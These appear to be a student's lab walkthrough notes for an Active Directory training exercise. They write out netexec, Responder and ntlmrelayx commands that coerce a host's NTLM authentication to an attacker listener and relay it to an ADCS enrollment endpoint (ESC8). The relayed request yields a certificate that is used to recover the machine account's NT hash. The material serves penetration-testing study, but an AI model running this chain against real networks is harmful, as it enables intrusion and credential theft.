Two major tools for these attacks
- coercer
- netexec's "coerce_plus" module


netexec
- by default, will try every method
- can choose the method yourself


se up the coercion with nxc
`nxc smb <IP> -u <user> -p <pass> -M coerce_plus -o LISTENER=<attacker_ip>`

set up responder or ntlmrelay to catch incoming auth
`sudo responder -I <interface>`

if PKINIT was successful, NetExec will request the NT hash
`nxc smb <dc-ip> -u ,user> -p '' --pfx-cert <certificate>`

### Learning Objective 19

**Check if ADCS is used by the target domain and find any vulnerable/abusable templates**
enumerate templates
`nxc ldap 172.16.13.10 -u ROBOOPS02$ -H <hash> -M adcs` 
![](assets/Pasted%20image%2020260724101432.png)

find vulnerable templates
`nxc ldap 172.16.13.10 -u ROBOOPS02$ -H <hash> -M certipy-find -o VULN-False ENABLED=True` 
![](assets/Pasted%20image%2020260724101529.png)
![](assets/Pasted%20image%2020260724101544.png)
![](assets/Pasted%20image%2020260724101714.png)
- can enroll to MachinePKINIT template with Domain Computers

load responder
`sudo responder -I tun0 -A`
- `-A` for analyze mode - don't need to poison anything

run coercion module
`nxc smb 172.16.13.10 -u ROBOOPS01$ -H <hash> -M coerce_plus -o LISTENER=<attacker_ip>` 
![](assets/Pasted%20image%2020260724101936.png)
- petitpotam is available and exploit was successfuly

checking responder again
![](assets/Pasted%20image%2020260724102008.png)


**NTLM Relay ROBOOPS01$ to the CAR-DC01 HTTP Endpoint (ESC8) ot compromise the ROBOOPS01$ machine account**
now that we know we can catch it, set up the relay
`impacket-ntlmrelayx -t http://172.16.13.1/certsrv/certfnsh.asp -smb2support --adcs --template "MachinePKINIT"`


do the coercion attack again
`nxc smb 172.16.13.10 -u ROBOOPS01$ -H <hash> -M coerce_plus -o LISTENER=<attacker_ip>` 
![](assets/Pasted%20image%2020260724102234.png)
- going back to ntlmrelayx, it shows that it wrote the pfx file


**Use the ROBOOPS01$.pfx certificate to retrieve the NT hash of the machine account using UnPAC-the-Hash**
`nxc smb 172.16.13.1 -u ROBOOPS01$ -p '' --pfx-cert ROBOOPS01$.pfx`
![](assets/Pasted%20image%2020260724102445.png)
- does the attack automatically, cuts out all the certipy commands